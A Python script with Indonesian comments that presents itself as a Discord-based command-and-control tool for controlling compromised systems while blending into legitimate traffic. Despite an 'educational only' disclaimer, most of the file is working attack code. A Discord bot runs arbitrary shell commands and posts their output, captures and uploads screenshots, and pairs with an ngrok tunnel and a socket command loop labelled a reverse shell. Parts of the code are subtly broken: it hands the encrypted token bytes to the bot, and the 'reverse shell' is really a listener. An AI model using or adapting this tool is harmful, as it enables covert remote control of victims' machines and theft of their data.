# Skrip ini mengintegrasikan fungsionalitas API Discord untuk komunikasi antara sistem yang dikompromikan dan server 
# yang dikendalikan penyerang. Fungsionalitas ini menggunakan komunikasi melalui platform Discord untuk menyembunyikan
# aktivitas berbahaya dalam lalu lintas komunikasi yang terlihat sah.

# Peringatan: Skrip ini dibuat hanya untuk tujuan edukasi. Penggunaan skrip ini untuk tindakan ilegal dapat mengakibatkan konsekuensi hukum.
# pip install -r requirements.txt
# python3 Discord-C2.py

# Mengimpor pustaka yang diperlukan
import subprocess  # Untuk menjalankan perintah sistem
import time        # Untuk pengaturan waktu tunggu
import socket      # Untuk membuat koneksi jaringan
import secrets     # Untuk menghasilkan data acak
import os          # Untuk operasi sistem file
import pyautogui   # Untuk menangkap tangkapan layar
from pyvirtualdisplay import Display  # Untuk membuat layar virtual
import requests    # Untuk membuat permintaan HTTP
from Crypto.Cipher import ChaCha20  # Untuk enkripsi menggunakan ChaCha20
import discord     # Untuk berinteraksi dengan API Discord
from discord.ext import commands  # Untuk membuat bot Discord dengan perintah

# Banner ASCII untuk tampilan awal
ASCII_BANNER = '''\033[95m
             ⣼⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣶⣦
           ⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⠛⠩⡐⢄⠢⠙⢋⠍⣉⠛⡙⡀⢆⡈⠍⠛⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⠃⠌⡡⠐⢂⠡⠉⡄⠊⢄⢂⠡⠐⠂⢌⠘⡰⠘⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⠃⠌⠒⢠⠑⡨⠄⠃⠤⠉⢄⠢⠌⢡⠉⢄⢂⠡⠒⠸⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⡏⠤⢉⠰⢁⢢⣶⣾⣧⢂⠩⡀⠆⣼⣶⣮⣄⠂⡂⠍⣂⢹⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⠁⢆⠨⢐⠂⣿⣿⣿⣿⠇⢂⠱⢸⣿⣿⣿⡿⢀⠂⠅⢢⠘⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⠌⢠⠂⢡⠊⠌⠛⠟⡋⢌⠂⢅⢂⡙⠿⠛⣁⢂⠉⡄⠃⡌⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⡨⠄⡘⠄⠎⣔⣉⡐⠌⡐⣈⠂⠆⡐⢂⣡⣤⢂⠡⡐⢡⢐⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣶⣥⣘⡐⠨⣽⣿⣿⣷⣶⣾⣾⣿⣿⣯⢁⠢⣐⣤⣷⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
           ⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
             ⠛⠿⢿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⠿⠟⠋
\033[0m'''

# Fungsi untuk menghasilkan kunci acak untuk enkripsi ChaCha20
def generate_random_key(length):
    # Mengembalikan kunci acak sepanjang 'length' byte
    return secrets.token_bytes(length)

# Fungsi untuk mengenkripsi token akses menggunakan ChaCha20
def encrypt_access_token(token, key_length):
    # Membuat kunci acak dengan panjang tertentu
    key = generate_random_key(key_length)
    cipher = ChaCha20.new(key=key)  # Membuat objek cipher dengan kunci acak
    encrypted_token = cipher.encrypt(token.encode())  # Mengenkripsi token yang diberikan
    nonce = cipher.nonce  # Nonce yang digunakan untuk dekripsi
    return nonce + encrypted_token  # Menggabungkan nonce dan token terenkripsi

# Fungsi untuk memulai tunnel ngrok
def start_ngrok(port):
    try:
        # Menjalankan ngrok dengan port TCP yang diberikan
        ngrok_process = subprocess.Popen(['ngrok', 'tcp', str(port)])
        time.sleep(3)  # Memberikan waktu agar ngrok siap
        return ngrok_process
    except Exception as e:
        print(f"Error starting ngrok: {e}")
        return None

# Fungsi untuk membuat koneksi reverse shell
def establish_reverse_shell(ip, port):
    try:
        # Membuat soket TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, int(port)))  # Mengikat soket ke IP dan port tertentu
        s.listen(1)  # Mendengarkan koneksi masuk
        print(f"[!] Waiting for incoming connection on {ip}:{port}...")
        client_socket, addr = s.accept()  # Menerima koneksi dari klien
        return client_socket, s
    except Exception as e:
        print(f"Error establishing reverse shell: {e}")
        return None, None

# Fungsi untuk memulai layar virtual (digunakan untuk menangkap tangkapan layar)
def start_display():
    try:
        display = Display(visible=0, size=(800, 600))  # Membuat layar virtual dengan resolusi tertentu
        display.start()  # Memulai layar virtual
        return display
    except Exception as e:
        print(f"Error starting virtual display: {e}")
        return None

# Fungsi untuk memulai bot Discord dengan token dan channel ID
def start_discord_bot(token, channel_id):
    try:
        bot = commands.Bot(command_prefix="!")  # Membuat bot dengan prefix perintah "!"

        @bot.event
        async def on_ready():
            # Dijalankan ketika bot berhasil terhubung ke Discord
            print("[*] Bot is ready and connected to Discord!")
            channel = bot.get_channel(int(channel_id))  # Mendapatkan objek channel
            await channel.send("C2 Bot is now online.")  # Mengirim pesan konfirmasi

        @bot.command()
        async def shell(ctx, *, command):
            # Menjalankan perintah shell yang diterima melalui bot Discord
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout  # Output standar
            stderr = result.stderr  # Output kesalahan

            if stdout:
                await ctx.send(f"Output:\n```{stdout}```")  # Mengirim output standar
            if stderr:
                await ctx.send(f"Error:\n```{stderr}```")  # Mengirim kesalahan jika ada

        @bot.command()
        async def screen(ctx):
            # Menangkap tangkapan layar dan mengirimkan hasilnya
            try:
                screen = pyautogui.screenshot()  # Menangkap layar
                screen.save("screenshot.png")  # Menyimpan gambar
                await ctx.send(file=discord.File("screenshot.png"))  # Mengirim file ke Discord
                os.remove("screenshot.png")  # Menghapus file setelah dikirim
            except Exception as e:
                await ctx.send(f"Error capturing screenshot: {e}")

        bot.run(token)  # Menjalankan bot
    except Exception as e:
        print(f"Error starting Discord bot: {e}")

# Fungsi utama yang menjalankan semua komponen skrip
def main():
    try:
        print(ASCII_BANNER)
        print("")

        # Meminta input dari pengguna
        token = input("[+] Enter your Discord bot token (press Enter to skip): ").strip()
        channel_id = input("[+] Enter your Discord channel ID (press Enter to skip): ").strip()
        ip = input("[+] Enter the IP for the reverse shell: ").strip()
        port = input("[+] Enter the port number for the reverse shell and ngrok: ").strip()

        # Validasi nomor port
        if not port.isdigit():
            print("Invalid port number. Exiting.")
            return

        port = int(port)

        # Enkripsi token jika diberikan
        encrypted_token = None
        if token and channel_id:
            print("[*] Encrypting Discord token...")
            key_length = 32  # Panjang kunci ChaCha20 dalam byte
            encrypted_token = encrypt_access_token(token, key_length)
            if not encrypted_token:
                print("Error encrypting token. Exiting.")
                return

        # Memulai tunnel ngrok
        print("[*] Starting ngrok tunnel...")
        ngrok_process = start_ngrok(port)
        if not ngrok_process:
            print("Error starting ngrok. Exiting.")
            return

        # Membuat koneksi reverse shell
        client_socket, server_socket = establish_reverse_shell(ip, port)
        if not client_socket:
            print("Error establishing reverse shell. Exiting.")
            return

        # Memulai layar virtual untuk tangkapan layar
        display = start_display()
        if not display:
            print("Error starting virtual display. Exiting.")
            return

        # Memulai bot Discord jika token dan channel ID diberikan
        if token and channel_id:
            print("[*] Starting Discord bot functionalities...")
            start_discord_bot(encrypted_token, channel_id)
        else:
            print("[*] Discord token or channel ID not provided. Running without Discord bot functionalities.")

        # Loop utama untuk menerima perintah
        while True:
            try:
                command = input("Enter a command to execute (or type 'exit' to quit): ").strip()
                if command.lower() == "exit":
                    break
                client_socket.send(command.encode())
                response = client_socket.recv(1024).decode()
                print(response)
            except KeyboardInterrupt:
                break

        # Membersihkan sumber daya
        if client_socket:
            client_socket.close()
        if server_socket:
            server_socket.close()
        if ngrok_process:
            ngrok_process.kill()
        if display:
            display.stop()
        print("[*] Exiting.")

    except Exception as e:
        print(f"Error in main function: {e}")

if __name__ == "__main__":
    main()
